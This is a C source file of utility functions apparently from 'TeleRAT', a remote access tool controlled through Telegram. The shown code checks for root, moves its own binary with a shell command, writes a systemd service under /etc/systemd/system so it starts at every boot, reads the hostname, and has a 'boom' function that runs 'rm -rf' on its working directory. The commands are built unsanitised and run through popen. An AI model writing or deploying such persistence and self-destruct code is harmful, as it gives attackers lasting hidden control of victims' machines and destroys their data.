#include "util.h"

//Check is this program run as root or not
void i_am_root(){
    if(getuid() != 0){
        printf("\nI'm not ROOOOOOT!.\n(Please Run with Sudo or ROOT)\n\n");
        exit(1);
    }
}

//get Program Name
void getpName(char *pName){
    unsigned int len = strlen(pName);
    //parse ./move -> /move
    strncpy(pName,pName+1,len-1);
    //add null byte for stop string
    pName[len-1] ='\0';
}

//Get Now file location
void getNowPath(char *nowPath){

    if (getcwd(nowPath, 1024) == NULL)
       perror("getcwd() error");
}
void exeCMD(char *cmd){
    char buf[250];
    FILE *fp = popen(cmd, "r");

    while (fgets(buf, 200, fp))
    {
        printf("%s:",buf);
        bzero(cmd,200);
        bzero(buf,200); 
   }
   pclose(fp);
}

void serviceSetting(char *path,char *pName){
    struct cmd_struct cmd;
    if(path == NULL) getNowPath(cmd.nowPath);
    getpName(pName);
	//Connect path with program	
	sprintf(cmd.cmd,"%s%s",cmd.nowPath,pName);
	
	//writing in /etc/systemd/system
	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","w");
	if(f == NULL)
	{
	   printf("Error can't open file");
	   exit(1);
	}
    char *text = malloc(sizeof(cmd.cmd));
	
	sprintf(text,"[Unit]\n"
		"Description = TeleRAT Remote Administrator Via Telegram\n\n"
        "[Service]\n"
	    "ExecStart =%s\n\n"
		"[Install]\n"
	    "WantedBy=multi-user.target\n\n",cmd.cmd);
	fprintf(f,"%s",text);
}

//parse path to command
void move(char *path, char *pName){
    struct cmd_struct cmd;
    //Get now program location
    getNowPath(cmd.nowPath);

    printf("%s",cmd.nowPath);


    getpName(pName);
    //parse path to cmd
    sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,pName,path,pName);
    // printf("%s",cmd.cmd);
    exeCMD(cmd.cmd);
    serviceSetting(path,pName);
}

void boom(char *path,char *pName){
    struct cmd_struct cmd;
    getNowPath(cmd.nowPath);
    getpName(pName);
    sprintf(cmd.cmd,"rm -rf %s",cmd.nowPath);
    exeCMD(cmd.cmd);
}




void getHostname(char *hostname){
    //Get hostname from this computer
    FILE *fp;
    fp = fopen("/etc/hostname","r");
    while (fgets(hostname, 1000, fp) != NULL)
    {
        // printf("%s", hostname);
    }
    fclose(fp);
}

